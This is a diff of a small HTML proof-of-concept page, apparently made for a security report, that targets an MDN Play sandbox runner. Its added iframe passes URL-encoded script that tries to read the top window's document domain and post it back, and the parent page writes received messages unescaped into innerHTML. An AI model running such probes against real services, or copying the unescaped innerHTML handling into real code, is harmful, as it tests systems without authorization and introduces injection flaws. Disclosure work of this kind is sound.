@@ -1,25 +1,20 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>N1 Play Sandbox Escape PoC</title>
-  </head>
-  <body>
-    <h2> N1 Play Sandbox Escape PoC</h2>
-    
-    <iframe 
-      src="https://815e6937-0602-4dc4-b396-34fc88f2798c.mdnplay.dev/runner.html?blank=&amp;theme=dark"
-      sandbox="allow-scripts allow-same-origin allow-forms"
-      width="800"
-      height="400"
-    ></iframe>
+<head><title>m Sandbox Escape - Real PoC</title></head>
+<body>
+  <h3>PoC: Reading top document domain (sandbox escape)</h3>
 
-    <script>
-  window.addEventListener("message", (event) => {
-    const p = document.createElement("p");
-    p.textContent = "Received from iframe: " + event.data;
-    document.body.appendChild(p);
-  });
-</script>
+  <iframe
+    src="https://815e6937-0602-4dc4-b396-34fc88f2798c.mdnplay.dev/runner.html?code=try%7Bwindow.parent.postMessage(%22TOP:%20%22%20+%20window.top.document.domain,%22*%22)%7Dcatch(e)%7Bwindow.parent.postMessage(%22ERR:%20%22%20+%20e.message,%22*%22)%7D"
+    sandbox="allow-scripts allow-same-origin"
+    width="800"
+    height="400"
+  ></iframe>
 
-  </body>
+  <script>
+    window.addEventListener("message", (event) => {
+      document.body.innerHTML += `<p style="color:red;">[Received] ${event.data}</p>`;
+    });
+  </script>
+</body>
 </html>
